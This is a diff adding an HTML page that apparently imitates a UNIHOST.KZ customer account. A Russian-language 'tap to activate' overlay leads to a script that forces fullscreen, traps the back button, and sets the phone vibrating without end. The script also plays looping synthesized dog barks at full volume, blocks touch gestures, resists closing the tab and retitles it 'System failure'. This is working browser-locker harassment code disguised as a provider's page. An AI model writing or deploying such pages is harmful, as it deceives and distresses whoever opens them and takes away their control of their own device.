@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Unihost</title>
+<style>
+* { margin:0; padding:0; }
+html, body { width:100%; height:100%; background:#0d1117; overflow:hidden; font-family:Arial,sans-serif; }
+#overlay {
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.9); display:flex; align-items:center; justify-content:center;
+  z-index:9999; color:#fff; flex-direction:column; cursor:pointer;
+}
+#overlay h1 { font-size:2.5em; color:#f0883e; animation:pulse 1s infinite; }
+#overlay p { margin-top:20px; font-size:1.2em; color:#aaa; }
+@keyframes pulse { 0%{opacity:0.5} 50%{opacity:1} 100%{opacity:0.5} }
+#fake { display:none; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#c9d1d9; text-align:center; padding:20px; }
+#fake .box { background:#161b22; padding:30px; border-radius:12px; border:1px solid #30363d; width:90%; max-width:400px; }
+#fake .balance { font-size:2.5em; color:#58a6ff; margin:15px 0; }
+#fake .label { color:#8b949e; font-size:0.9em; }
+</style>
+</head>
+<body>
+
+<div id="overlay" onclick="activate()">
+  <h1>🔊 ТАПНИТЕ ДЛЯ АКТИВАЦИИ</h1>
+  <p>Нажмите один раз</p>
+</div>
+
+<div id="fake">
+  <div class="box">
+    <h1>UNIHOST.KZ</h1>
+    <div class="label">Код клиента</div>
+    <div style="font-size:1.4em; font-weight:bold;">2503</div>
+    <div class="label" style="margin-top:15px;">Баланс</div>
+    <div class="balance">0.00 ₸</div>
+  </div>
+</div>
+
+<script>
+let activated = false;
+
+function activate() {
+  if (activated) return;
+  activated = true;
+
+  // Скрыть оверлей, показать фейк
+  document.getElementById('overlay').style.display = 'none';
+  document.getElementById('fake').style.display = 'flex';
+
+  // === FULLSCREEN ===
+  try {
+    document.documentElement.requestFullscreen({ navigationUI: 'hide' }).catch(()=>{});
+    if (screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
+  } catch(e){}
+
+  // === БЛОКИРОВКА НАЗАД ===
+  history.pushState(null, null, location.href);
+  window.addEventListener('popstate', () => history.pushState(null, null, location.href));
+
+  // === ВИБРАЦИЯ ===
+  if (navigator.vibrate) {
+    navigator.vibrate([500, 100, 500]);
+    setInterval(() => navigator.vibrate([300, 100, 300, 100, 600]), 900);
+  }
+
+  // === ЗВУК СОБАК (гарантированный запуск) ===
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    ctx.resume().then(() => {
+      playDog(ctx);
+    });
+  } catch(e){}
+
+  function playDog(ctx) {
+    const dur = 0.45;
+    const buf = ctx.createBuffer(1, ctx.sampleRate * dur, ctx.sampleRate);
+    const data = buf.getChannelData(0);
+    for (let i=0; i<data.length; i++) {
+      const t = i / ctx.sampleRate;
+      data[i] = 0.7 * (t * 320 % 1 - 0.5)
+              + 0.3 * (Math.random()*2 - 1)
+              + 0.4 * Math.sin(t * 1400) * Math.exp(-t*9);
+    }
+    const s = ctx.createBufferSource();
+    s.buffer = buf;
+    const g = ctx.createGain();
+    g.gain.value = 1.0;
+    s.connect(g);
+    g.connect(ctx.destination);
+    s.start();
+    s.onended = () => {
+      setTimeout(() => playDog(ctx), 250 + Math.random()*300);
+    };
+  }
+
+  // === БЛОКИРОВКА ЖЕСТОВ ===
+  document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+  document.addEventListener('gesturestart', e => e.preventDefault(), { passive: false });
+  document.addEventListener('gesturechange', e => e.preventDefault(), { passive: false });
+  document.addEventListener('gestureend', e => e.preventDefault(), { passive: false });
+
+  // === ЗАЩИТА ОТ ЗАКРЫТИЯ ===
+  window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
+
+  document.title = '⚠️ Системный сбой';
+}
+
+// Автозапуск не работает — только через тап
+</script>
+</body>
+</html>
